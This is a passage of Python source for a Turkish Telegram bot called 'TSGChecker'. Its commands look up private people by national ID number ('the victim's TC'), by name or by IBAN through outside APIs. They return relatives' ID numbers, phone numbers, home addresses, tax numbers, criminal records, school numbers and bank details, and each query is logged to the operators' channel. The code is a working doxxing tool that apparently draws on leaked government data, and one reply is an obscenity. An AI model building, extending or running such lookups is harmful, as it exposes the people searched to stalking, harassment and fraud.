┃➥ ADI: {adi}
┃➥ SOYADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogum_tarihi}
┃➥ NUFUS IL: {nufus_il}
┃➥ NUFUS ILCE: {nufus_ilce}
┃➥ ANNE ADI: {anne_adi}
┃➥ ANNE TC: {anne_tc}
┃➥ BABA ADI: {baba_adi}
┃➥ BABA TC: {baba_tc}
┃➥ UYRUK: {uyruk}
{gsm_mesaj}╰━━━━━━━━━━━━━━╯
""")

                    bot.send_message(message.chat.id, response_text)
                else:
                    cevap = "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯"
                    bot.send_message(message.chat.id, cevap)
            else:
                cevap = f"api hata kod: ({response.status_code}): {response.text}"
                bot.send_message(message.chat.id, cevap)
        else:
            cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
            bot.send_message(message.chat.id, cevap)
    else:
        cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
        bot.send_message(message.chat.id, cevap)



@bot.message_handler(commands=["aile"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/aile', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/aile"):
        tc = mesaj.replace("/aile", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/aile.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data["success"] == True:
                    people = json_data["data"]
                    cevap = "╭━━━━━━━━━━━━━╮\n┃➥ @TSGChecker\n╰━━━━━━━━━━━━━╯\n"
                    for person in people:
                        tc = person.get("TC", "-")
                        adi = person.get("ADI", "-")
                        soyadi = person.get("SOYADI", "-")
                        dogumtarihi = person.get("DOGUMTARIHI", "-")
                        nufusil = person.get("NUFUSIL", "-")
                        nufusilce = person.get("NUFUSILCE", "-")
                        anneadi = person.get("ANNEADI", "-")
                        annetc = person.get("ANNETC", "-")
                        babaadi = person.get("BABAADI", "-")
                        babatc = person.get("BABATC", "-")
                        uyruk = person.get("UYRUK", "-")
                        yakinlik = person.get("Yakınlık", "-")

                        info = f"""╭━━━━━━━━━━━━━━
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOY ADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogumtarihi}
┃➥ İL: {nufusil}
┃➥ İLÇE: {nufusilce}
┃➥ ANNE ADI: {anneadi}
┃➥ ANNE TC: {annetc}
┃➥ BABA ADI: {babaadi}
┃➥ BABA TC: {babatc}
┃➥ UYRUK: {uyruk}
┃➥ YAKINLIK: {yakinlik}
╰━━━━━━━━━━━━━━"""
                        cevap += info

                    file_name = f"Sonuçlar.txt"
                    with open(file_name, 'w', encoding='utf-8') as file:
                        file.write(cevap)

                    with open(file_name, 'rb') as file:
                        bot.send_document(message.chat.id, file, caption=f"**", parse_mode="Markdown")
                    
                    bot.delete_message(message.chat.id, start_message.message_id)
                else:
                    bot.reply_to(message, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯")
            else:
                bot.reply_to(message, f"hata ({response.status_code}).")
        else:
            bot.reply_to(message, "╭──────────────────────╮\n┃ 📛 Yanlış Formatlı TC\n┃ Kodu düzeltip tekrar deneyin.")


@bot.message_handler(commands=["sorgu"])
def sorgu(message):
    """Handle the /sorgu command."""
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    "Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. "
                    "Kanal ve chate katılıp tekrar deneyin.\n\n"
                    "Kanal: @TSGChecker\n"
                    "Chat: @TSGCheckerChat")
        bot.send_message(message.chat.id, response)
        return

    # Parse the command arguments
    text = message.text
    words = text.split()

    # Initialize parameters
    isim = None
    isim2 = None
    soyisim = None
    il = None
    ilce = None

    # Parse the user input
    for i in range(len(words)):
        if words[i] == "-isim" and i < len(words) - 1:
            isim = words[i + 1]
        elif words[i] == "-isim2" and i < len(words) - 1:
            isim2 = words[i + 1]
        elif words[i] == "-soyisim" and i < len(words) - 1:
            soyisim = words[i + 1]
        elif words[i] == "-il" and i < len(words) - 1:
            il = words[i + 1]
        elif words[i] == "-ilce" and i < len(words) - 1:
            ilce = words[i + 1]

    if not isim or not soyisim:
        bot.reply_to(message, "Yanlış Kullanım! Doğru format: /sorgu -isim <isim> -soyisim <soyisim> [-il <il>] [-ilce <ilce>]")
        return

    chat_id = message.chat.id

    log_message = (f"Yeni Sorgu Atıldı!\n"
                   f"Sorgulanan İsim: {isim}\n"
                   f"Sorgulanan Soyisim: {soyisim}\n"
                   f"Sorgulanan İl: {il}\n"
                   f"Sorgulanan İlçe: {ilce}\n"
                   f"Sorgulayan ID: {user_id}\n"
                   f"Sorgulayan Adı: {user_name}\n"
                   f"Kanal ID: {chat_id}")

    bot.send_message(-1002017751874, log_message)

    start_message = bot.send_message(chat_id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    try:
        # Construct the API URL with proper encoding
        api_url = "https://sowixapi.online/api/sowixapi/adsoyadilce.php"
        params = {
            'ad': f"{isim} {isim2}" if isim2 else isim,
            'soyad': soyisim
        }
        if il:
            params['il'] = il
        if ilce:
            params['ilce'] = ilce

        encoded_params = urllib.parse.urlencode(params)
        api_url = f"{api_url}?{encoded_params}"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        response = requests.get(api_url, headers=headers)
        response.raise_for_status()
        data = response.json()

        if data.get("success") == "true":
            number = data.get("number", 0)
            if number > 0:
                people = data.get("data", [])
                info = ""
                for person in people:
                    tc = person.get("TC", "Bilinmiyor")
                    ad = person.get("ADI", "Bilinmiyor")
                    soyad = person.get("SOYADI", "Bilinmiyor")
                    dogumtarihi = person.get("DOGUMTARIHI", "Bilinmiyor")
                    nufusil = person.get("NUFUSIL", "Bilinmiyor")
                    nufusilce = person.get("NUFUSILCE", "Bilinmiyor")
                    anneadi = person.get("ANNEADI", "Bilinmiyor")
                    annetc = person.get("ANNETC", "Bilinmiyor")
                    babaadi = person.get("BABAADI", "Bilinmiyor")
                    babatc = person.get("BABATC", "Bilinmiyor")
                    uyrugu = person.get("UYRUK", "Bilinmiyor")

                    info += (f"""╭━━━━━━━━━━━━━╮
┃➥ @TSGChecker
╰━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━╮
┃➥TC: {tc}
┃➥ ADI: {ad}
┃➥ SOYADI: {soyad}
┃➥ DOĞUM TARİHİ: {dogumtarihi}
┃➥ ANNE ADI: {anneadi}
┃➥ ANNE TC: {annetc}
┃➥ BABA ADI: {babaadi}
┃➥ BABA TC: {babatc}
┃➥ İL: {nufusil}
┃➥ İLÇE: {nufusilce}
┃➥ UYRUK: {uyrugu}
╰━━━━━━━━━━━━━━╯
""")

                file_name = "Sonuçlar.txt"
                with open(file_name, 'w', encoding='utf-8') as file:
                    file.write(info)

                with open(file_name, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                    bot.delete_message(chat_id, start_message.message_id)
            else:
                bot.send_message(message.chat.id, "Veri Bulunamadı.")
                bot.delete_message(chat_id, start_message.message_id)
        else:
            bot.send_message(message.chat.id, "Data bulunamadı.")
            bot.delete_message(chat_id, start_message.message_id)

    except requests.exceptions.HTTPError as http_err:
        bot.send_message(message.chat.id, f"HTTP hata oluştu: {http_err}")
        bot.delete_message(chat_id, start_message.message_id)
    except ValueError:
        bot.send_message(message.chat.id, "API'den dönen veri JSON formatında değil. Lütfen daha sonra tekrar deneyiniz.")
        bot.delete_message(chat_id, start_message.message_id)
    except Exception as err:
        bot.send_message(message.chat.id, f"Bir hata oluştu: {err}")
        bot.delete_message(chat_id, start_message.message_id)

import requests

@bot.message_handler(commands=["tcgsm"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    cevap = "╭━━━━━━━━━━━━━╮\n┃➥ @TSGChecker\n╰━━━━━━━━━━━━━╯"
    text = message.text.split()[1]  
    api_url = f"http://172.208.52.218/api/legaliapi/tcgsm.php?tc={text}"
    response = requests.get(api_url)
    data = response.json()

    if data.get("success", False) and "data" in data and len(data["data"]) > 0:
        people = data["data"]
        info = ""
        for person in people:
            tc = person.get("TC")
            gsm = person.get("GSM")
            
            info += f"""
╭━━━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
┃➥ GSM: {gsm}
╰━━━━━━━━━━━━━━━━╯"""
        cevap += info
        bot.send_message(message.chat.id, cevap)

        log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                      f"Sorgulanan TC: {text}\n" \
                      f"Sorgulayan ID: {user_id}\n" \
                      f"Sorgulayan Adı: {user_name}\n" \
                      f"Sorgulayan K. Adı: @{message.from_user.username}"
        bot.send_message(-1002017751874, log_message)  
    else:
        bot.send_message(message.chat.id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖬ı\n╰────────────╯")


import requests

@bot.message_handler(commands=["okulno"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/okulno"):
        tc = mesaj.replace("/okulno", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/okulno.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if "tc" in json_data:
                    tc = json_data["tc"]
                    ad = json_data["ad"]
                    soyad = json_data["soyad"]
                    okulno = json_data["okulno"]
                    info = f"""
                    ╭━━━━━━━━━━━━━╮
                    ┃➥ Author: @logogogogogo
                    ┃➥ T.C Kimlik Numarası: `{tc}`
                    ┃➥ Adı: `{ad}`
                    ┃➥ Soyadı: `{soyad}`
                    ┃➥ Okul Numarası: `{okulno}`
                    ╰━━━━━━━━━━━━━╯"""
                    bot.send_message(message.chat.id, info, parse_mode="Markdown")
                else:
                    bot.send_message(message.chat.id, "╭━━━━━━━━━━━━━╮\n┃➥ Sonuç: Bulunamadı.\n╰━━━━━━━━━━━━━╯")
            else:
                bot.reply_to(message, "API'den başarısız yanıt alındı.")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekle






import requests
import json

import requests

@bot.message_handler(commands=["adres"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    text = message.text.split()[1]
    api_url = f"https://sowixapi.online/api/sowixapi/adres.php?tc={text}"
    response = requests.get(api_url)

    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("success", False) and "data" in response_data and len(response_data["data"]) > 0:
            person_data = response_data["data"]
            KimlikNo = person_data.get("KimlikNo", "Bilgi Yok")
            AdSoyad = person_data.get("AdSoyad", "Bilgi Yok")
            DogumYeri = person_data.get("DogumYeri", "Bilgi Yok")
            VergiNumarasi = person_data.get("VergiNumarasi", "Bilgi Yok")
            Ikametgah = person_data.get("Ikametgah", "Bilgi Yok")

            cevap = f"""
╭━━━━━━━━━━━━━━━━╮
┃➥ TC: {KimlikNo}
┃➥ Ad Soyad: {AdSoyad}
┃➥ Doğum Yeri: {DogumYeri}
┃➥ Vergi Numarası: {VergiNumarasi}
┃➥ İkametgah: {Ikametgah}
╰━━━━━━━━━━━━━━━━╯"""

            bot.send_message(message.chat.id, cevap)

            log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                          f"Sorgulanan TC: {text}\n" \
                          f"Sorgulayan ID: {user_id}\n" \
                          f"Sorgulayan Adı: {user_name}\n" \
                          f"Sorgulayan K. Adı: @{message.from_user.username}"
            bot.send_message(-1002017751874, log_message)
        else:
            bot.send_message(message.chat.id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖬ı\n╰────────────╯")
    else:
        bot.send_message(message.chat.id, "API'den veri alınamadı. Lütfen daha sonra tekrar deneyin.")


import requests

@bot.message_handler(commands=["sicil"])
def tcgsm_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    text = message.text.split()[1]
    api_url = f"https://sowixapi.online/api/sowixapi/sicil.php?tc={text}"

    try:
        response = requests.get(api_url).json()
        result = response[0]
        
        output = f"""
        ╔═══════════════
        ╟ TC: {result["KIMLIKNO"]}
        ╟ ADI: {result["ISIM"]}
        ╟ SOY ADI: {result["SOYISIM"]}
        ╟ SAYI: {result["SAYI"]}
        ╟ S. TÜRÜ: {result["SORGUTURU"]}
        ╟ K. TÜRÜ: {result["KIMLIKTURU"]}
        ╟ SİCİL: {result["SICILKAYIT"]}
        ╟ İŞLENEN YER: {result["SICILINISLENDIGIYER"]}
        ╚═══════════════
        """
        
        bot.send_message(message.chat.id, output)

        log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                      f"Sorgulanan TC: {text}\n" \
                      f"Sorgulayan ID: {user_id}\n" \
                      f"Sorgulayan Adı: {user_name}\n" \
                      f"Sorgulayan K. Adı: @{message.from_user.username}"
        bot.send_message(-1002017751874, log_message)
    except Exception as e:
        bot.send_message(message.chat.id, f"API'den veri alınamadı. Hata: {e}")

# BOT AKTİF EDİLDİ...



@bot.message_handler(commands=['yaz'])
def yaz_command(message):
    try:
        
        text = message.text.replace('/yaz ', '')

        
        formatted_text = text.replace(' ', '%20')

        
        api_url = f'http://apis.xditya.me/write?text={formatted_text}'

        
        response = requests.get(api_url)

        if response.status_code == 200:
            
            bot.send_photo(message.chat.id, photo=("@TSGChecker.jpg", response.content))
        else:
            bot.reply_to(message, 'yarrami ye.')

    except Exception as e:
        bot.reply_to(message, 'sg')



import requests

# Assuming these functions exist somewhere in your code
def is_user_member(user_id, chat_id):
    pass

# Assuming 'bot' is your Telegram bot instance

import requests

@bot.message_handler(commands=["ailepro"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/ailepro"):
        tc = mesaj.replace("/ailepro", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/ailepro.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success", False):
                    people = json_data.get("data", [])
                    cevap = "Aile Bilgileri:\n"
                    for person_group in people:
                        for person in person_group:
                            adi = person.get("ADI", "-")
                            soyadi = person.get("SOYADI", "-")
                            tc = person.get("TC", "-")
                            dogumtarihi = person.get("DOGUMTARIHI", "-")
                            nufusil = person.get("NUFUSIL", "-")
                            nufusilce = person.get("NUFUSILCE", "-")
                            anneadi = person.get("ANNEADI", "-")
                            annetc = person.get("ANNETC", "-")
                            babaadi = person.get("BABAADI", "-")
                            babatc = person.get("BABATC", "-")
                            uyruk = person.get("UYRUK", "-")
                            yakinlik = person.get("Yakınlık", "-")
                            gsm_mesaj = ""
                            for gsm_numarasi in person.get("gsm", []):
                                gsm_mesaj += f"┃➥ GSM: {gsm_numarasi}\n"

                            info = f"""╭━━━━━━━━━━━━━━
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOY ADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogumtarihi}
┃➥ İL: {nufusil}
┃➥ İLÇE: {nufusilce}
┃➥ ANNE ADI: {anneadi}
┃➥ ANNE TC: {annetc}
┃➥ BABA ADI: {babaadi}
┃➥ BABA TC: {babatc}
┃➥ UYRUK: {uyruk}
┃➥ YAKINLIK: {yakinlik}
{gsm_mesaj}
╰━━━━━━━━━━━━━━"""
                            cevap += info

                    file_name = f"Sonuçlar.txt"
                    with open(file_name, 'w', encoding='utf-8') as file:
                        file.write(cevap)

                    with open(file_name, 'rb') as file:
                        bot.send_document(message.chat.id, file)
                        bot.delete_message(message.chat.id, start_message.message_id)
                else:
                    bot.reply_to(message, "API'den başarısız yanıt alındı.")
            else:
                bot.reply_to(message, f"API'ye istek gönderirken bir hata oluştu. Durum Kodu: {response.status_code}")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekleyin




import requests

# Önceki fonksiyonları ve bot ayarlarınızı buraya ekleyin

@bot.message_handler(commands=["burc"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/burc"):
        tc = mesaj.replace("/burc", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/burc.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success", False):
                    data = json_data.get("data", {})
                    burc = data.get("burc", "Bilgi Bulunamadı")
                    
                    response_message = f"Burcunuz: {burc}"
                    bot.send_message(message.chat.id, response_message)
                else:
                    bot.reply_to(message, "API'den başarısız yanıt alındı.")
            else:
                bot.reply_to(message, f"API'ye istek gönderirken bir hata oluştu. Durum Kodu: {response.status_code}")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekleyin




    


import requests
import os

import requests

@bot.message_handler(commands=['iban'])
def iban_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    chat_id = message.chat.id
    user_input = message.text.split(' ', 1)

    if len(user_input) != 2:
        bot.send_message(chat_id, "Lütfen geçerli bir IBAN girin.")
        return

    iban = user_input[1]
    api_url = f'http://172.208.52.218/api/legaliapi/iban.php?iban={iban}'

    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        if 'Ad' in data and 'Kod' in data:
            banka_sube = {
                'Banka Adı': data['Ad'].strip('\"'),
                'Banka Kodu': data['Kod'].strip('\"'),
                'Swift': data['Swift'].strip('\"'),
                'Hesap No': data['Hesap No'].strip('\"'),
                'Şube Adı': data['Şube Adı'].strip('\"'),  
                'Şube Kodu': data['Şube Kodu'].strip('\"'),  
                'İl': data['İl'].strip('\"'),
                'İlçe': data['İlçe'].strip('\"'),
                'Tel': data['Tel'].strip('\"'),
                'Fax': data['Fax'].strip('\"')
            }

            response_message = (
                "╭━━━━━━━━━━━━━━━╮\n"
                "┃➥ Banka ve Şube Bilgileri\n"
                f"┃➥ Banka Adı: {banka_sube['Banka Adı']}\n"
                f"┃➥ Banka Kodu: {banka_sube['Banka Kodu']}\n"
                f"┃➥ Swift: {banka_sube['Swift']}\n"
                f"┃➥ Hesap No: {banka_sube['Hesap No']}\n"
                f"┃➥ Şube Adı: {banka_sube['Şube Adı']}\n"
                f"┃➥ Şube Kodu: {banka_sube['Şube Kodu']}\n"
                f"┃➥ İl: {banka_sube['İl']}\n"
                f"┃➥ İlçe: {banka_sube['İlçe']}\n"
                f"┃➥ Tel: {banka_sube['Tel']}\n"
                f"┃➥ Fax: {banka_sube['Fax']}\n"
                "╰━━━━━━━━━━━━━━━╯"
            )

            bot.send_message(chat_id, response_message)
            log_message = (
                f"Yeni IBAN Sorgu Atıldı!\n"
                f"Sorgulanan IBAN: {iban}\n"
                f"Sorgulayan ID: {user_id}\n"
                f"Sorgulayan Adı: {user_name}\n"
                f"Sorgulayan K. Adı: @{message.from_user.username}"
            )
            bot.send_message(-1002017751874, log_message)
        else:
            bot.send_message(chat_id, "╭─────📛─────╮\n│ Sonuç Bulunamadı\n╰────────────╯")
    else:
        bot.send_message(chat_id, "Veri alınırken bir hata oluştu.")


from fake_email import Email
from rich.console import Console

user_data = {}


@bot.message_handler(commands=["mail"])
def start_handler(message):
    user_id = message.from_user.id
    email_obj = Email() 
    email_bilgisi = email_obj.Mail()  
    user_data[user_id] = {
        "eposta": email_bilgisi["mail"],
        "session": email_bilgisi["session"]
    }
    eposta = user_data[user_id]["eposta"]
    gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
    
    bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
    bot.send_message(message.chat.id, bilgi)

    
    if gelen_mesajlar:
        bot.send_message(message.chat.id, "Yeni bir e-posta geldi!")


@bot.message_handler(commands=['refresh'])
def refresh_handler(message):
    user_id = message.from_user.id
    if user_id in user_data:
        eposta = user_data[user_id]["eposta"]
        gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
        bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
        bot.send_message(message.chat.id, bilgi)
    else:
        bot.send_message(message.chat.id, "Önce /start komutunu kullanarak başlamalısınız.")

    import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests


def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator"]
    except Exception as e:
        print(f"Hata: {e}")
        return False

import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests









@bot.message_handler(commands=['meme'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    # is_user_member fonksiyonunu tanımlayın ve kullanıcının üyelik durumunu kontrol edin
    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
    
    text = message.text.replace('/meme ', '')  

    try:
        # Local a.png dosyasından resmi yükle
        image = Image.open("a.png")

        draw = ImageDraw.Draw(image)

        position = (380, 380)  

        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()  # Font indirme hatası için kontrol ekliyoruz
        font = ImageFont.truetype(BytesIO(font_response.content), size=50)  

        draw.text(position, text, (160, 100, 50), font=font, spacing=10, align="center")  

        shadow_position = (position[0] + 1, position[1] + 1)  
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=10, align="center")  
        
        blurred_image = image.filter(ImageFilter.GaussianBlur(radius=1.8))

        # Buffer kullanmadan doğrudan resmi göndermek mümkün değil, dolayısıyla resmi kaydedip gönderiyoruz
        buffered = BytesIO()
        blurred_image.save(buffered, format="JPEG")  # JPEG formatında kaydediyoruz, çünkü Telegram JPEG formatını daha iyi destekliyor
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: {err}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: {e}")



@bot.message_handler(commands=['meme1'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    text = message.text.replace('/meme1 ', '')

    try:
